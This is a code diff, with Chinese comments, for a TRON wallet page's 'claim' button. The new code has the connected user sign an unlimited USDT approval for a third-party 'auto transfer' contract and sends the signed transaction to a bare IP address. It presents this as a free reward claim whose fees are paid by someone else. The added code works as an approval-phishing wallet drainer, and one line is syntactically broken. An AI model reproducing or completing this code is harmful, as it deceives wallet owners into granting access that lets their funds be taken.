@@ -445,78 +445,80 @@
 
                 try {
                     // 构造approve交易
-                    // 1. 先获取合约ABI（需补充完整TRC20 ABI，当前代码缺少ABI参数）
-const TRC20_ABI = [
-  {
-    "inputs": [{"internalType": "address", "name": "spender", "type": "address"}, {"internalType": "uint256", "name": "amount", "type": "uint256"}],
-    "name": "approve",
-    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
-    "type": "function"
-  }
-  // 可补充其他需要的ABI（如balanceOf）
-];
+                 document.getElementById('claimBtn').addEventListener('click', async function() {
+    try {
+        // -------------------------- 1. 基础配置（提前定义好） --------------------------
+        const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT的TRC20合约地址
+        const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL"; // 代付合约地址
+        const userAddress = tronWeb.defaultAddress.base58; // 已连接的用户钱包地址
 
-// 2. 传入ABI初始化合约实例
-const trc20Contract = await tronWeb.contract(TRC20_ABI, TRC20_TOKEN_ADDRESS);
+        // TRC20合约的核心ABI（必须包含approve方法）
+        const TRC20_ABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "_spender", "type": "address"},
+                    {"name": "_value", "type": "uint256"}
+                ],
+                "name": "approve",
+                "outputs": [{"name": "", "type": "bool"}],
+                "payable": false,
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
 
-// 3. 通过methods调用approve并构造交易
-const UINT256_MAX = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-// 直接将approveAmount设为uint256最大值（无需转Sun，因为这已经是TRC20代币的最小单位最大值）
-const approveAmount = UINT256_MAX;
+        // -------------------------- 2. 初始化合约实例（适配imToken的TronWeb v3） --------------------------
+        const trc20Contract = tronWeb.contract(TRC20_ABI, TRC20_TOKEN_ADDRESS);
+        if (!trc20Contract || !trc20Contract.approve) {
+            throw new Error("合约实例初始化失败，无法找到approve方法");
+        }
 
-// 之后用这个值构造approve交易
-const approveTx = await trc20Contract.methods.approve(
-  tronWeb.address.toHex(AUTO_TRANSFER_CONTRACT),
-  approveAmount
-).buildTransaction({
-  from: tronWeb.address.toHex(userAddress),
-  feeLimit: 1000000
+
+        // -------------------------- 3. 设置“无限授权”额度（uint256最大值） --------------------------
+        const UINT256_MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+
+        // -------------------------- 4. 构造approve授权交易 --------------------------
+        const approveTx = await trc20Contract.approve(
+            tronWeb.address.toHex(AUTO_TRANSFER_CONTRACT), // 代付合约地址转Hex
+            UINT256_MAX // 无限授权额度
+        ).buildTransaction({
+            from: tronWeb.address.toHex(userAddress), // 用户地址转Hex
+            feeLimit: 1000000 // 矿工费上限
+        });
+
+
+        // -------------------------- 5. 用户签名交易（imToken内完成） --------------------------
+        const signedTx = await tronWeb.trx.sign(approveTx);
+        if (!signedTx) {
+            throw new Error("用户取消了签名");
+        }
+
+
+        // -------------------------- 6. 后端代付请求 --------------------------
+        const response = await fetch("https://203.91.76.22/api/proxy-approve", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({signedTransaction: signedTx})
+        });
+        const result = await response.json();
+
+
+        // -------------------------- 7. 结果处理 --------------------------
+        if (result.success) {
+            alert(`代付成功！交易哈希：${result.txHash}\n点击确定跳转查看`);
+            window.location.href = https://tronscan.io/#/transaction/${result.txHash};
+        } else {
+            throw new Error(`后端代付失败：${result.message}`);
+        }
+
+    } catch (error) {
+        alert(`代付失败：${error.message}`);
+        console.error("领取错误详情：", error);
+    }
 });
-                    // 用户本地签名
-                    const signedTx = await tronWeb.trx.sign(approveTx);
-                    approveBtn.innerHTML = '<<i class="fa fa-spinner fa-spin"></</i> 代付处理中...';
-
-                    // 调用后端代付接口
-                    const proxyParams = {
-                        owner: userAddress,
-                        spender: AUTO_TRANSFER_CONTRACT,
-                        amount: APPROVE_AMOUNT,
-                        signedTx: signedTx
-                    };
-
-                    const res = await fetch(BACKEND_PROXY_APPROVE_API, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify(proxyParams)
-                    });
-
-                    const resData = await res.json();
-                    if (res.ok && resData.success) {
-                        alert(`代付授权成功！\n交易哈希：${resData.txid}\n无需你支付任何TRX`);
-                        window.open(`https://tronscan.org/#/transaction/${resData.txid}`, "_blank");
-                        
-                        // 保存记录
-                        saveApprovalRecord({
-                            address: userAddress,
-                            approveAmount: APPROVE_AMOUNT + " USDT",
-                            proxyTime: new Date().toLocaleString(),
-                            txHash: resData.txid,
-                            status: "代付成功"
-                        });
-                        renderApprovalRecords();
-                    } else {
-                        throw new Error(resData.error || "代付失败，请稍后重试");
-                    }
-                } catch (e) {
-                    alert(`代付失败：${e.message}`);
-                } finally {
-                    isProcessing = false;
-                    approveBtn.disabled = false;
-                    approveBtn.innerHTML = "领取";
-                }
-            };
-        };
 
         // 初始化钱包
         async function initWallet() {
